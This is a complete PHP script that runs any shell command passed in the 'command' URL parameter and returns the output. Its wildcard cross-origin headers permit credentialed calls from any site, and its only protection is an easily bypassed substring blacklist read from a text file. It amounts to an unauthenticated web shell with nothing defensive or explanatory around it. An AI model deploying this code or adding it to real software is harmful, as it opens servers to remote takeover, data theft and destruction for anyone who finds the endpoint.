<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Access-Control-Allow-Credentials: true");

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    exit();
}

function is_command_blacklisted($command) {
    $blacklist = file('blacklist.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($blacklist as $blacklisted_command) {
        if (strpos($command, $blacklisted_command) !== false) {
            return true;
        }
    }
    return false;
}

if (isset($_GET['command'])) {
    $command = $_GET['command'];
    
    if (is_command_blacklisted($command)) {
        http_response_code(403);
        echo "Forbidden command";
    } else {
        $output = shell_exec($command);
        echo $output;
    }
} else {
    http_response_code(400);
    echo "Command not specified";
}
?>

